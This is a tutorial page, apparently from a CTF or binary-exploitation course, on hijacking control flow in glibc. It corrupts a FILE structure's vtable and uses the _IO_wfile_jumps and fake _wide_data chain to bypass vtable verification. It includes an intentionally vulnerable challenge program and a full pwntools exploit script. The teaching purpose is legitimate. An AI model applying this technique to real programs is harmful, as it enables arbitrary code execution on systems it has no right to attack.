#metadata(
  (
    title: "Hijacking Control Flow",
    description: "Abusing the FILE structure vtable pointer to hijack execution and jump to arbitrary functions.",
    date: "2026-01-02",
    order: 6,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

= Hijacking Control Flow via Vtable Overwrite

Beyond arbitrary reads and writes, the most powerful FSOP technique involves overwriting the `vtable` pointer (at offset `0xd8`). Since all file operations (like `fwrite`, `fread`, `fclose`) look up their implementation in this table, redirecting it allows for immediate control flow hijacking.

== The `_IO_FILE_plus` Structure

What we typically refer to as a `FILE` struct is often the `_IO_FILE_plus` structure in Glibc. It extends the standard `_IO_FILE` with a pointer to a virtual function table (`vtable`).

```c
struct _IO_FILE_plus
{
  struct _IO_FILE file;
  const struct _IO_jump_t *vtable;
};
```

When a standard library function like `fwrite` is called, it accesses this vtable to find the appropriate function for the operation (e.g., `_IO_xsputn` for writing).

```c
// Internal macro for calling the vtable entry
#define _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)
```

By overwriting the `vtable` pointer at the end of the structure (offset `0xd8` on x64), we can force the program to jump to an address of our choosing when a file operation occurs.

== Vulnerable Scenario

This challenge provides a `win()` function and a direct overflow into a `FILE` structure. The goal is to hijack the vtable to execute `win()`. Note: In modern Glibc versions (>= 2.24), vtable verification mitigates direct overwrites, necessitating more advanced techniques like `_IO_wfile_jumps` or targeting `_wide_data`.

== Source Code

```c
// gcc -o challenge challenge.c -no-pie
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

FILE *fp;
char *buf;

void win() { puts("Well done baby"); }

int main(int argc, char **argv, char **envp) {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);

  printf("Another cake: %p\n", puts);

  buf = malloc(0x100);

  fp = fopen("/tmp/uiiaiiuuiiai.txt", "r");

  printf("Here's the cake: %p\n", buf);
  puts("Please enter your name.");
  read(0, buf, 0x100);
  printf("Hello, %s!\n", buf);

  read(0, fp, 0x1e0);

  fwrite(buf, 1, 0x100, fp);

  return 0;
}
```

== Exploit Strategy: The `_IO_wfile_jumps` Bypass

Modern Glibc (>= 2.24) validates the `vtable` pointer to ensure it stays within the `__libc_IO_vtables` section. To bypass this, we redirect the `vtable` to `_IO_wfile_jumps`, which is a legitimate table. By manipulating the `_wide_data` structure, we can eventually trigger a call to a function pointer we control.

=== Why this works

When `fwrite` is called, it attempts to invoke `_IO_file_xsputn` via the vtable pointer. In assembly, this looks like:

```asm
// rax holds the vtable pointer from our FILE struct
call qword ptr [rax + 0x38]  ; Calls the function at offset 0x38 (normally _IO_file_xsputn)
```
```c
p ((struct _IO_FILE_plus *)fp)->vtable==((struct _IO_FILE_plus *)$rax) //checking rax is vtable
$9 = 1 //it's true
```
```c
p ((struct _IO_FILE_plus *)fp)->vtable
$3 = (const struct _IO_jump_t *) 0x7eff19c07030 <_IO_file_jumps> //normal vtable
```


Directly pointing `vtable` to our `win()` function (minus `0x38`) fails due to vtable verification. However, `_IO_wfile_jumps` is a valid vtable. By pointing our corrupted `vtable` to `_IO_wfile_jumps - 0x20`, the call at `rax + 0x38` becomes:

$ ("_IO_wfile_jumps" - "0x20") + "0x38" = "_IO_wfile_jumps" + "0x18" $

At offset `0x18` of `_IO_wfile_jumps` lies the function `_IO_wfile_overflow`. This function, crucially, uses the `_wide_data` pointer (which *we control*) to find yet another vtable (`_wide_vtable`), which is *not* verified.

The chain of execution proceeds as follows:
1. `fwrite` calls `vtable + 0x38` -> lands on `_IO_wfile_overflow`.
2. `_IO_wfile_overflow` calls `_IO_wdoallocbuf` (using our `_wide_data`).
3. `_IO_wdoallocbuf` calls a function from our fake `_wide_vtable` at offset `0x68`:

```asm
// Inside _IO_wdoallocbuf
call qword ptr [rax + 0x68] ; We place the address of win() here!
```

=== Call Flow Summary

1. *`fwrite(..., fp)`*: The program calls `fwrite` using our corrupted `FILE` pointer.
2. *`fp->vtable + 0x38`*: Glibc looks up `__xsputn` in the vtable. Since we set `vtable` to `_IO_wfile_jumps - 0x20`, this lands on `_IO_wfile_overflow`.
3. *`_IO_wfile_overflow(fp)`*: This function is executed. It checks the `_wide_data` structure.
4. *`_IO_wdoallocbuf(fp)`*: Called internally by `_IO_wfile_overflow`.
5. *`fp->_wide_data->_wide_vtable + 0x68`*: `_IO_wdoallocbuf` looks up its allocation function in the *wide* vtable.
6. *`win()`*: Since we pointed `_wide_vtable` back to our buffer and placed `win` at offset `0x68`, the program jumps to our target.

=== Offset Analysis

The exploit uses two payloads to coordinate the hijack:

==== 1. The Fake `_wide_data` Struct (Payload 1)
This payload is placed in `buf` (the heap buffer) and acts as both the `_IO_wide_data` structure and its own virtual function table.

- *`0x68` (`__doallocate`)*: We place the address of `win()` here. In the `_IO_wfile_overflow` code path, Glibc eventually calls the `__doallocate` function from the wide vtable.
- *`0xE0` (`_wide_vtable`)*: This is the pointer to the virtual function table for wide characters. We point it back to the start of our buffer, making the buffer act as a fake vtable.
```python
fake_wide_data = flat({
  0x68: elf.sym.win,
  0xE0: buffer
}, filler=b"\x00" )
```

==== 2. The Corrupted `_IO_FILE` Struct (Payload 2)
This payload overwrites the actual `FILE` structure.

- *`0x88` (`_lock`)*: Must point to a writable memory region to avoid crashing when Glibc attempts to lock the file. We use `buffer - 0x10`.
- *`0xA0` (`_wide_data`)*: Points to our fake structure in the heap (`buffer`).
- *`0xD8` (`vtable`)*: Points to `_IO_wfile_jumps - 0x20`.
  - When `fwrite` is called, it invokes the `__xsputn` entry (offset `0x38`) of the vtable.
  - By setting the vtable to `_IO_wfile_jumps - 0x20`, the `xsputn` call actually hits `(_IO_wfile_jumps - 0x20) + 0x38 = _IO_wfile_jumps + 0x18`.
  - Offset `0x18` in `_IO_wfile_jumps` is `_IO_wfile_overflow`, which then triggers our wide data hijack.

```python
fp = flat(
    {
        0x88: buffer - 0x10,                    #_lock
        0xA0: buffer,                           #_wide_data
        0xD8: libc.sym._IO_wfile_jumps - 0x20,  #vtable tries to point IO_wfile_overflow
    },
    filler=b"\x00",
)
```

== Exploit Script

```python
from pwn import *

elf = context.binary = ELF("./challenge")
context.terminal = ["tmux", "splitw", "-h"]

p = process(elf.path)

libc = elf.libc

p.recvuntil(b": ")
leak = int(p.recvline().strip(), 16)
libc.address = leak - libc.sym.puts
info(f"Libc base: {hex(libc.address)}")

p.recvuntil(b": ")
buffer = int(p.recvline().strip(), 16)
info(f"Buffer address: {hex(buffer)}")

fake_wide_data = flat({
  0x68: elf.sym.win,
  0xE0: buffer
}, filler=b"\x00" )
p.sendline(fake_wide_data)

fp = flat(
    {
        0x88: buffer - 0x10,                    #_lock
        0xA0: buffer,                           #_wide_data
        0xD8: libc.sym._IO_wfile_jumps - 0x20,  #vtable tries to point IO_wfile_overflow
    },
    filler=b"\x00",
)

p.sendline(fp)

p.interactive()
```


